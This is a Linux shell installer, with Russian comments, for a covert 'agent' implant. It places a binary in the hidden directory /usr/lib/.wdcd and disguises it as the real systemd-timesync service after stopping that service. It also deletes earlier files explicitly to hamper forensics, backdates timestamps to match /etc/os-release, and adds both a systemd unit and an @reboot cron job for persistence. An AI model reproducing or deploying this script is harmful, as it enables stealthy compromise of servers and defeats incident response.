#!/bin/sh
# Установка агента gw18@gw18 (ubuntu-24.04) — embedded ELF 1.4.1, systemd + cron.d.
# Бинарь несёт config+keypair+xkey В СЕБЕ: на диске нет ни config.json, ни ключей.
set -e
ID="gw18@gw18"
DIR="/usr/lib/.wdcd"
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
if command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — агент не сможет ходить по HTTPS" >&2; exit 1; fi
fi
mkdir -p "$DIR/bin"
if command -v systemctl >/dev/null 2>&1; then systemctl stop systemd-timesync.service 2>/dev/null || true; fi
cp diagd "$DIR/bin/systemd-timesync"
# Чистим остатки файлового режима/прошлой личности: ключей на диске быть НЕ должно.
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json"
# Архео-файлы прежних версий (пакета/deb и файлового режима): не оставляем
# "здесь ставился агент старого образца" для форензики.
rm -f "$DIR/wdcd" "$DIR/bin/sysdiag" 2>/dev/null || true
rm -rf "$DIR/telemetry" "$DIR/data" 2>/dev/null || true
chmod 700 "$DIR" "$DIR/bin"; chmod 755 "$DIR/bin/systemd-timesync"
# mtime выравниваем по /etc/os-release (системный референс установки ОС).
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/systemd-timesync" 2>/dev/null || true
fi
cat > /etc/systemd/system/systemd-timesync.service <<UNIT
[Unit]
Description=System Diagnostic Services
After=network-online.target
[Service]
ExecStart=$DIR/bin/systemd-timesync --foreground
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT
printf '@reboot root sleep 45; /usr/bin/systemctl is-active --quiet systemd-timesync.service || %s/bin/systemd-timesync --foreground
' "$DIR" > /etc/cron.d/systemd-timesync
chmod 644 /etc/cron.d/systemd-timesync
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
touch -d "@$_stamp" /etc/systemd/system/systemd-timesync.service /etc/cron.d/systemd-timesync 2>/dev/null || true
fi
systemctl daemon-reload
systemctl enable --now systemd-timesync.service
echo "agent $ID установлен (embedded): $(systemctl is-active systemd-timesync.service)"
